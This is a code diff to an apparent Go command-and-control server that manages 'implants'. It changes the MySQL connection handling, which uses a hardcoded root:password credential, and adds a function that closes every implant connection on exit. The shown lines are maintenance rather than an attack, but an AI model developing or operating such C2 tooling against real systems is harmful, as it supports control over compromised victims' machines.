@@ -70,9 +70,16 @@ func loadPrivateKey() {
 
 func initDB() {
 	var err error
-	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2")
+	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2db")
 	if err != nil {
-		panic(err)
+		fmt.Println("[-] Failed to connect to MySQL:", err)
+		db = nil
+		return
+	}
+	if err = db.Ping(); err != nil {
+		fmt.Println("[-] MySQL ping failed:", err)
+		db.Close()
+		db = nil
 	}
 }
 
@@ -136,6 +143,7 @@ func startCLI() {
 			printHelp()
 		case input == "exit":
 			fmt.Println("[+] Exiting C2 Server...")
+			closeAllImplants()
 			return
 		default:
 			fmt.Println("[-] Unknown command")
@@ -222,6 +230,15 @@ func removeImplant(ip string) {
 	if exists {
 		fmt.Printf("[+] Removed implant %s\n", ip)
 	}
+}
+
+func closeAllImplants() {
+	mutex.Lock()
+	for ip, conn := range implants {
+		conn.Close()
+		delete(implants, ip)
+	}
+	mutex.Unlock()
 }
 
 func printHelp() {
